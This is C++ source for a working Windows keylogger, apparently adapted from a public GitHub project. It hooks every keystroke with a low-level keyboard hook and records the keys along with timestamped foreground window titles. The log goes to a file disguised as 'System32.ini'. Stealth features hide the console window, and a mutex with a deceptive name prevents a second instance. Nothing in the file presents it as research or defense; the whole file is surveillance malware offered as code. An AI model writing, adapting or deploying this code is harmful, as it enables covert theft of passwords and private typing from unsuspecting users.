// https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx
// https://github.com/GiacomoLaw/Keylogger/blob/master/windows/klog_main.cpp
#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, char *file);

extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			
			// save to file
			Save(kbdStruct.vkCode, "System32.ini");
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, char *file)
{
	char lastwindow[256];
	bool printSHFT = true;
	int key_print = key_stroke;
	
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks
	
	if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		return 0; // ignore shift
	

	if ((key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL))
		return 0;

	if (key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU)
		return 0; 
	
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
		
	
	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);
		
		if(strcmp(window_title, lastwindow)!=0) {
			strcpy(lastwindow, window_title);
			
			// get time
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);
			
			fprintf(OUTPUT_FILE, "\n\n%s [%s]\n", s, window_title);
		}
	}


	std::cout << key_stroke << '\n';
	// std::cout << "VK_SHIFT" << GetKeyState(VK_SHIFT) << '\n';
	// std::cout << "VK_LSHIFT" << GetKeyState(VK_LSHIFT) << '\n';
	// std::cout << "VK_RSHIFT" << GetKeyState(VK_RSHIFT) << "\n\n";

	bool isshift = (GetKeyState(VK_SHIFT) & 0x8000) == 0x8000 || (GetKeyState(VK_LSHIFT) & 0x8000) == 0x8000 || (GetKeyState(VK_RSHIFT) & 0x8000) == 0x8000;
	bool isctrl = (GetKeyState(VK_CONTROL) & 0x8000) == 0x8000 || (GetKeyState(VK_LCONTROL) & 0x8000) == 0x8000 || (GetKeyState(VK_RCONTROL) & 0x8000) == 0x8000;
	// Check CONTROL
	if (isctrl)
		fprintf(OUTPUT_FILE, "%s", "[CTRL]");

	// Check ALT
	// if ((GetKeyState(VK_MENU) & 0x8000) == 0x8000)
	// 	fprintf(OUTPUT_FILE, "%s", "[ALT]");
	// else if ((GetKeyState(VK_LMENU) & 0x8000) == 0x8000)
	// 	fprintf(OUTPUT_FILE, "%s", "[ALT]");
	// else if ((GetKeyState(VK_RMENU) & 0x8000) == 0x8000)
	// 	fprintf(OUTPUT_FILE, "%s", "[ALT]");


	if (key_print >= 65 && key_print <= 90)
	{ // A-Z
		printSHFT = false;
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 1);

		// check shift key
		if (isshift) {
			lowercase = !lowercase;
		}


		if (lowercase) key_print += 32;

	}
	else if (isshift)
	{
		switch(key_print){
			case '0' : key_print = ')'; printSHFT = false;break;
			case '1' : key_print = '!'; printSHFT = false;break;
			case '2' : key_print = '@'; printSHFT = false;break;
			case '3' : key_print = '#'; printSHFT = false;break;
			case '4' : key_print = '$'; printSHFT = false;break;
			case '5' : key_print = '%'; printSHFT = false;break;
			case '6' : key_print = '^'; printSHFT = false;break;
			case '7' : key_print = '&'; printSHFT = false;break;
			case '8' : key_print = '*'; printSHFT = false;break;
			case '9' : key_print = '('; printSHFT = false;break;
			case VK_OEM_1		: key_print = isshift? ':' : ';'; printSHFT = false;break;
			case VK_OEM_PLUS	: key_print = isshift? '+' : '='; printSHFT = false;break;
			case VK_OEM_COMMA	: key_print = isshift? '<' : ','; printSHFT = false;break;
			case VK_OEM_MINUS	: key_print = isshift? '_' : '-'; printSHFT = false;break;
			case VK_OEM_PERIOD	: key_print = isshift? '>' : '.'; printSHFT = false;break;
			case VK_OEM_2		: key_print = isshift? '?' : '/'; printSHFT = false;break;
			case VK_OEM_3		: key_print = isshift? '~' : '`'; printSHFT = false;break;
			case VK_OEM_4		: key_print = isshift? '{' : '['; printSHFT = false;break;
			case VK_OEM_5		: key_print = isshift? '|' : '\\'; printSHFT = false;break;
			case VK_OEM_6		: key_print = isshift? '}' : ']'; printSHFT = false;break;
			case VK_OEM_7		: key_print = isshift? '"' : '\''; printSHFT = false;break;
		}
	}



	if ((isctrl && key_stroke == key_print) || (isshift && printSHFT))
		fprintf(OUTPUT_FILE, "%s", "[SHFT]");

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BCKSPC]");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[ENTR]");
	// else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
	// 	fprintf(OUTPUT_FILE, "%s", "[SHFT]");
	// else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
	// {
	// 	fprintf(OUTPUT_FILE, "%s", "[CTRL]");
	// }
	// else if (key_stroke == VK_MENU || key_stroke == VK_LMENU || key_stroke == VK_RMENU)
	// 	fprintf(OUTPUT_FILE, "%s", "[ALT]");
	else if (key_stroke == VK_PAUSE)
		fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
	else if (key_stroke == 20)
	{
		fprintf(OUTPUT_FILE, "%s", "[CPSLCK/");
		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
			fprintf(OUTPUT_FILE, "%s", "OFF]");
		else
			fprintf(OUTPUT_FILE, "%s", "ON]");
	}
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_PRIOR)
		fprintf(OUTPUT_FILE, "%s", "[PGUP]");
	else if (key_stroke == VK_NEXT)
		fprintf(OUTPUT_FILE, "%s", "[PGDN]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == VK_SELECT)
		fprintf(OUTPUT_FILE, "%s", "[SELECT]");
	else if (key_stroke == VK_EXECUTE)
		fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
	else if (key_stroke == VK_SNAPSHOT)
		fprintf(OUTPUT_FILE, "%s", "[PRTSC]");
	else if (key_stroke == VK_INSERT)
		fprintf(OUTPUT_FILE, "%s", "[INS]");
	else if (key_stroke == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[DEL]");
	else if (key_stroke == VK_HELP)
		fprintf(OUTPUT_FILE, "%s", "[HELP]");
	else if (key_stroke == VK_LWIN)
		fprintf(OUTPUT_FILE, "%s", "[LEFT WIN]");
	else if (key_stroke == VK_SLEEP)
		fprintf(OUTPUT_FILE, "%s", "[SLEEP]");
	else if (key_stroke >= VK_NUMPAD0 && key_stroke <= VK_NUMPAD9)
		fprintf(OUTPUT_FILE, "[NUM %d]",(key_stroke - VK_NUMPAD0));
	else if (key_stroke >= VK_F1 && key_stroke <= VK_F24)
		fprintf(OUTPUT_FILE, "[F%d]",(key_stroke - VK_F1 + 1));
	else if (key_stroke == VK_NUMLOCK)
	{
		fprintf(OUTPUT_FILE, "%s", "[NUMLCK/");
		if ((GetKeyState(VK_NUMLOCK) & 0x0001) != 0)
			fprintf(OUTPUT_FILE, "%s", "OFF]");
		else
			fprintf(OUTPUT_FILE, "%s", "ON]");
	}
	else if (key_stroke == VK_SCROLL)
		fprintf(OUTPUT_FILE, "%s", "[SCROLL]");
	else if (key_stroke == VK_BROWSER_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BRWSR BACK]");
	else if (key_stroke == VK_BROWSER_FORWARD)
		fprintf(OUTPUT_FILE, "%s", "[BRWSR FWD]");
	else if (key_stroke == VK_BROWSER_REFRESH)
		fprintf(OUTPUT_FILE, "%s", "[BRWSR RFRSH]");
	// ADA LAGI TAPI MALES
	else if (key_stroke == VK_VOLUME_MUTE)
		fprintf(OUTPUT_FILE, "%s", "[VOL MUTE]");
	else if (key_stroke == VK_VOLUME_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[VOL -]");
	else if (key_stroke == VK_VOLUME_UP)
		fprintf(OUTPUT_FILE, "%s", "[VOL +]");
	else if (key_stroke == VK_MEDIA_NEXT_TRACK)
		fprintf(OUTPUT_FILE, "%s", "[NEXT TRACK]");
	else if (key_stroke == VK_MEDIA_PREV_TRACK)
		fprintf(OUTPUT_FILE, "%s", "[PREV TRACK]");
	else if (key_stroke == VK_MEDIA_STOP)
		fprintf(OUTPUT_FILE, "%s", "[STOP MEDIA]");
	else if (key_stroke == VK_MEDIA_PLAY_PAUSE)
		fprintf(OUTPUT_FILE, "%s", "[PLAY/PAUSE]");
	else if (key_stroke == VK_PLAY)
		fprintf(OUTPUT_FILE, "%s", "[PLAY]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
			fprintf(OUTPUT_FILE, "%c", key_stroke);
		}
		else
			fprintf(OUTPUT_FILE, "%c", key_print);
	}
	fclose(OUTPUT_FILE);

	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}

int main()
{
	// check multiple programs
	// http://www.cplusplus.com/forum/beginner/121344/
	const char systemcallservicesX789[] = "RUN32_BASH64";
	HANDLE hHandle = CreateMutex( NULL, TRUE, systemcallservicesX789);
	if( ERROR_ALREADY_EXISTS == GetLastError() )
	{
		// Program already running somewhere
		std::cout << "Program already running" << std::endl;
		CloseHandle (hHandle);
		return(1); // Exit program
	}

	// visibility of window
	Stealth();

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
